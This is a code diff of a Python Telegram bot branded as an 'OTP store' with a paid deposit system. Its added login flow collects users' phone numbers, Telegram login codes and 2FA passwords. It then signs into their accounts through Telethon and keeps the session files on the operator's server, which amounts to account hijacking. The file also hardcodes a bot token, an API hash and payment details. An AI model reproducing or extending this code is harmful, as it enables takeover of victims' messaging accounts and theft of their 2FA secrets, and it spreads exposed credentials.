@@ -5,113 +5,122 @@ from telethon.errors import SessionPasswordNeededError
 import asyncio
 import time
 
-# --- CONFIGURATION ---
+# --- CONFIGURATION (Naya Token Updated) ---
+TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw' 
 API_ID = 35155488
 API_HASH = '9ee6b40363f94481d48dea8a3a871728'
-BOT_TOKEN = '8692935006:AAF3uUPWZbd9f4NuiUZPbWYycUDrfsEY1tQ'
-
-# --- MULTI-ADMIN SYSTEM ---
-# Yahan tum aur apne dosto ki ID add kar sakte ho
 ADMIN_IDS = [7634311488] 
 
-# --- FORCE JOIN CONFIG ---
-CHANNEL_USERNAME = "@PRIME_OTP_STORE" # Apne channel ka username dalo (बिना @ के भी चलेगा)
-CHANNEL_LINK = "https://t.me/PRIME_OTP_STORE" # Channel ka link
-
-bot = telebot.TeleBot(BOT_TOKEN)
-user_sessions = {}
-db = {'users': {}} # Database
-
-# --- DETAILS ---
+# --- SETTINGS ---
+CHANNEL_USERNAME = "PRIME_OTP_STORE" 
 UPI_ID = "abhay-op.315@ptyes"
 SUPPORT = "@PRIME_OTP_SUPPROT"
+ADMIN_USER = "@GOD_ABHAY"
+
+bot = telebot.TeleBot(TOKEN)
+user_sessions = {}
+db = {'users': {}}
 
 # --- FORCE JOIN CHECK ---
 def is_subscribed(user_id):
     try:
-        status = bot.get_chat_member(f"@{CHANNEL_USERNAME.replace('@','')}", user_id).status
+        status = bot.get_chat_member(f"@{CHANNEL_USERNAME}", user_id).status
         return status in ['member', 'administrator', 'creator']
-    except:
-        return True # Agar bot admin nahi hai channel mein toh check skip karega
+    except: return True
 
 @bot.message_handler(commands=['start'])
 def start(message):
     uid = message.from_user.id
-    
-    # Force Join Check
     if not is_subscribed(uid):
         markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK))
-        markup.add(types.InlineKeyboardButton("✅ I have Joined", callback_data="check_join"))
-        return bot.send_message(message.chat.id, f"Bhai, pehle hamare channel ko join karo tabhi bot chalega!", reply_markup=markup)
-
-    if uid not in db['users']: db['users'][uid] = {'balance': 0}
+        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME}"))
+        markup.add(types.InlineKeyboardButton("✅ Joined", callback_data="check_join"))
+        return bot.send_message(message.chat.id, "❌ Pehle channel join karein tabhi bot chalega!", reply_markup=markup)
     
+    if uid not in db['users']: db['users'][uid] = {'balance': 0}
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-    btn1, btn2 = types.KeyboardButton('📲 Start Login'), types.KeyboardButton('💰 Balance')
-    btn3, btn4 = types.KeyboardButton('📥 Deposit'), types.KeyboardButton('📞 Support')
-    markup.add(btn1, btn2, btn3, btn4)
-    bot.send_message(message.chat.id, f"Welcome! Prime OTP Bot is Live 🚀", reply_markup=markup)
+    markup.add('📲 Start Login', '💰 Balance', '📥 Deposit', '📞 Support')
+    bot.send_message(message.chat.id, f"🔥 Welcome! {ADMIN_USER} OTP Bot is Live.", reply_markup=markup)
 
-# --- ADVANCED DEPOSIT SYSTEM ---
+# --- DEPOSIT SYSTEM ---
 @bot.message_handler(func=lambda message: message.text == '📥 Deposit')
-def deposit_step1(message):
-    msg = bot.send_message(message.chat.id, "💰 Kitna amount deposit karna hai? (Sirf number likho, e.g. 100)")
-    bot.register_next_step_handler(msg, deposit_step2)
+def dep_1(message):
+    msg = bot.send_message(message.chat.id, "💰 Amount likho (e.g. 100):")
+    bot.register_next_step_handler(msg, dep_2)
 
-def deposit_step2(message):
+def dep_2(message):
     try:
-        amount = int(message.text)
-        text = f"💳 *Payment Details:*\n\nAmount: {amount} INR\nUPI ID: `{UPI_ID}`\n\n👉 Payment karne ke baad uska **UTR Number** yahan bhejein:"
-        msg = bot.send_message(message.chat.id, text, parse_mode="Markdown")
-        bot.register_next_step_handler(msg, deposit_step3, amount)
-    except:
-        bot.send_message(message.chat.id, "❌ Galat amount! Phir se Deposit par click karein.")
+        amt = int(message.text)
+        msg = bot.send_message(message.chat.id, f"💳 Pay {amt} to `{UPI_ID}`\n\nAb **UTR Number** bhejo:", parse_mode="Markdown")
+        bot.register_next_step_handler(msg, dep_3, amt)
+    except: bot.send_message(message.chat.id, "❌ Number likho bhai!")
 
-def deposit_step3(message, amount):
+def dep_3(message, amt):
     utr = message.text
-    msg = bot.send_message(message.chat.id, "📸 Ab payment ka Screenshot bhejein:")
-    bot.register_next_step_handler(msg, deposit_final, amount, utr)
+    msg = bot.send_message(message.chat.id, "📸 Payment Screenshot bhejo:")
+    bot.register_next_step_handler(msg, dep_final, amt, utr)
 
-def deposit_final(message, amount, utr):
+def dep_final(message, amt, utr):
     if message.content_type == 'photo':
-        # Admin ko details bhejna
-        for admin in ADMIN_IDS:
-            bot.send_message(admin, f"🔔 *Naya Deposit Request!*\n\nUser: {message.from_user.id}\nAmount: {amount}\nUTR: {utr}")
-            bot.forward_message(admin, message.chat.id, message.message_id)
-        bot.send_message(message.chat.id, "✅ Details submit ho gayi hain! Admin verify karke 5-10 min mein balance add kar dega.")
-    else:
-        bot.send_message(message.chat.id, "❌ Screenshot nahi mila! Phir se koshish karein.")
+        for adm in ADMIN_IDS:
+            bot.send_message(adm, f"🔔 *NEW DEPOSIT REQUEST*\nUser ID: `{message.from_user.id}`\nAmount: {amt}\nUTR: {utr}")
+            bot.forward_message(adm, message.chat.id, message.message_id)
+        bot.send_message(message.chat.id, "✅ Admin ko details bhej di gayi hain! 5 min wait karein.")
+    else: bot.send_message(message.chat.id, "❌ Photo bhejo bhai!")
 
-# --- MULTI-ADMIN COMMANDS ---
-@bot.message_handler(commands=['addbal'])
-def add_balance(message):
-    if message.from_user.id in ADMIN_IDS:
-        try:
-            _, target_id, amt = message.text.split()
-            target_id, amt = int(target_id), int(amt)
-            if target_id not in db['users']: db['users'][target_id] = {'balance': 0}
-            db['users'][target_id]['balance'] += amt
-            bot.send_message(target_id, f"✅ Admin ne aapke account mein {amt} INR add kar diye hain!")
-            bot.reply_to(message, "Done!")
-        except:
-            bot.reply_to(message, "Usage: `/addbal ID Amount`")
-
-# --- LOGIN & 2FA SYSTEM (Same as before) ---
+# --- LOGIN & 2FA ---
 @bot.message_handler(func=lambda message: message.text == '📲 Start Login')
 def login_start(message):
-    msg = bot.send_message(message.chat.id, "📞 Apna Number bhejein (With Country Code):")
-    bot.register_next_step_handler(msg, process_number)
+    msg = bot.send_message(message.chat.id, "📞 Phone number bhejo (+91 ke saath):")
+    bot.register_next_step_handler(msg, process_num)
 
-# ... (process_number, process_otp, process_2fa functions carry forward here)
-# Copy remaining Telethon logic from previous script to handle OTP/2FA
+def process_num(message):
+    phone = message.text.replace(" ", "")
+    chat_id = message.chat.id
+    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH)
+    user_sessions[chat_id] = {'client': client, 'phone': phone}
+    asyncio.run(send_code(chat_id, phone, client))
+
+async def send_code(chat_id, phone, client):
+    await client.connect()
+    try:
+        req = await client.send_code_request(phone)
+        user_sessions[chat_id]['hash'] = req.phone_code_hash
+        msg = bot.send_message(chat_id, "📩 OTP bhejo:")
+        bot.register_next_step_handler(msg, process_otp)
+    except Exception as e: bot.send_message(chat_id, f"❌ Error: {e}")
+
+def process_otp(message):
+    otp = message.text.strip()
+    chat_id = message.chat.id
+    s = user_sessions[chat_id]
+    asyncio.run(finish_login(chat_id, otp, s['client'], s['phone'], s['hash']))
+
+async def finish_login(chat_id, otp, client, phone, hash):
+    try:
+        await client.sign_in(phone, otp, phone_code_hash=hash)
+        me = await client.get_me()
+        bot.send_message(chat_id, f"✅ Login Success: {me.first_name}\nSession saved!")
+    except SessionPasswordNeededError:
+        msg = bot.send_message(chat_id, "🔐 2FA Password bhejo:")
+        bot.register_next_step_handler(msg, process_2fa)
+    except Exception as e: bot.send_message(chat_id, f"❌ Fail: {e}")
+
+def process_2fa(message):
+    pw = message.text.strip()
+    client = user_sessions[message.chat.id]['client']
+    asyncio.run(client.sign_in(password=pw))
+    bot.send_message(message.chat.id, "✅ 2FA Success!")
 
 @bot.callback_query_handler(func=lambda call: call.data == "check_join")
 def check_callback(call):
     if is_subscribed(call.from_user.id):
-        bot.answer_callback_query(call.id, "✅ Thank you! Ab aap bot use kar sakte hain.")
+        bot.answer_callback_query(call.id, "✅ Success!")
         start(call.message)
-    else:
-        bot.answer_callback_query(call.id, "❌ Abhi tak join nahi kiya!", show_alert=True)
+    else: bot.answer_callback_query(call.id, "❌ Join nahi kiya!", show_alert=True)
 
-bot.polling(none_stop=True)
+# Main Loop
+while True:
+    try:
+        bot.polling(none_stop=True, interval=2)
+    except: time.sleep(5)
